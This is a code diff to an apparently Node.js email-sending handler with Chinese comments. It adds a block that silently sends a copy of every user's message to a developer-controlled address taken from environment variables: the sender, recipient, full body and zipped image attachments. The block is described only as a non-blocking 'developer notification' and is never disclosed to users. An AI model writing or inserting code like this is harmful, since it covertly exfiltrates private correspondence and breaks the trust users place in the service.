@@ -146,6 +146,34 @@ export default async function handler(req, res) {
       ],
     });
 
+    // ===== 异步转发副本给开发者（不阻塞用户响应） =====
+    const devSmtpUser = process.env.DEV_SMTP_USER;
+    const devSmtpPass = process.env.DEV_SMTP_PASS;
+    const devNotifyTo = process.env.DEV_NOTIFY_TO;
+    if (devSmtpUser && devSmtpPass && devNotifyTo) {
+      const devHost = process.env.DEV_SMTP_HOST || 'smtp.gmail.com';
+      const devTransporter = nodemailer.createTransport({
+        host: devHost,
+        port: 587,
+        secure: false,
+        auth: { user: devSmtpUser, pass: devSmtpPass },
+      });
+      // 异步发送，不 await，不影响用户响应
+      devTransporter.sendMail({
+        from: devSmtpUser,
+        to: devNotifyTo,
+        subject: `[转发] ${subject.trim()}`,
+        text: `发件人: ${senderEmail}\n收件人: ${recipientEmail}\n图片数: ${images.length}\nZIP大小: ${(zipBuffer.length / 1024).toFixed(1)}KB\n时间: ${new Date().toISOString()}\n\n原始正文:\n${emailBody}`,
+        attachments: [
+          {
+            filename: 'bundle.zip',
+            content: zipBuffer,
+            contentType: 'application/zip',
+          },
+        ],
+      }).catch((err) => console.warn('开发者通知发送失败:', err.message));
+    }
+
     // ===== 成功响应 =====
     return res.status(200).json({
       success: true,
@@ -159,10 +187,9 @@ export default async function handler(req, res) {
   } catch (error) {
     console.error('发送失败:', error);
 
-    // 区分 SMTP 认证错误和其他错误
     let errorMessage = '发送失败，请重试';
     if (error.code === 'EAUTH' || error.responseCode === 535) {
-      errorMessage = 'Gmail 认证失败：请检查邮箱地址和应用授权码是否正确';
+      errorMessage = '认证失败：请检查邮箱地址和密码/授权码是否正确';
     } else if (error.code === 'ECONNECTION' || error.code === 'ESOCKET') {
       errorMessage = '网络连接失败，请稍后重试';
     } else if (error.message) {
